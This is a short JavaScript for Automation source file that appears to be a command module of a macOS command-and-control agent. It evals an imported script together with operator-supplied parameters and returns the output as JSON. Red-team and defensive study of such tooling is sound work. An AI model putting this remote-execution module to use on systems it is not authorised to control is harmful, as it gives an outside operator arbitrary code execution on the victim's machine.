exports.jsimport_call = function(task, command, params){
    try{
        let output = ObjC.deepUnwrap(eval(jsimport + "\n " + params));
        if(output === "" || output === undefined){
            return JSON.stringify({"user_output":"No command output", "completed": true});
        }
        if(output === true){
            return JSON.stringify({"user_output":"True", "completed": true});
        }
        if(output === false){
            return JSON.stringify({"user_output":"False", "completed": true});
        }
        if(typeof(output) != "string"){
            output = String(output);
        }
        return JSON.stringify({"user_output":output, "completed": true});
    }
    catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE